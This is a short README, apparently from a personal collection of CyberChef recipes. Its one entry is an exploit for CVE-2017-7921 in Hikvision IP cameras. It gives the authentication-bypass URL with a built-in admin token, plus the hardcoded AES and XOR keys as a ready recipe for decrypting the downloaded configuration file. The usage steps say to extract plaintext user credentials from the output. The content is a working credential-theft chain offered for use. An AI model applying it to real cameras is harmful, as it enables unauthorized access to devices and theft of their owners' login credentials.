# cyberchef-recipes
> a collection of cyberchef recipes i've written or cobbled together

---

## Hikvision IP Camera Auth Bypass - Configuration File Decryption
`CVE-2017-7921`

https://cyberchef.org/#recipe=AES_Decrypt(%7B'option':'Hex','string':'279977f62f6cfd2d91cd75b889ce0c9a'%7D,%7B'option':'Hex','string':''%7D,'ECB','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)XOR(%7B'option':'Hex','string':'738B5544'%7D,'Standard',false)


```json
[
  { "op": "AES Decrypt",
    "args": [{ "option": "Hex", "string": "279977f62f6cfd2d91cd75b889ce0c9a" }, { "option": "Hex", "string": "" }, "ECB", "Raw", "Raw", { "option": "Hex", "string": "" }, { "option": "Hex", "string": "" }] },
  { "op": "XOR",
    "args": [{ "option": "Hex", "string": "738B5544" }, "Standard", false] }
]
```
### Usage
- Download the configuration file from the camera using `http://<IP>/System/configurationFile?auth=YWRtaW46MTEK` and open it as an input file in CyberChef.
- Download the output and parse it for the plaintext user login credentials.

---
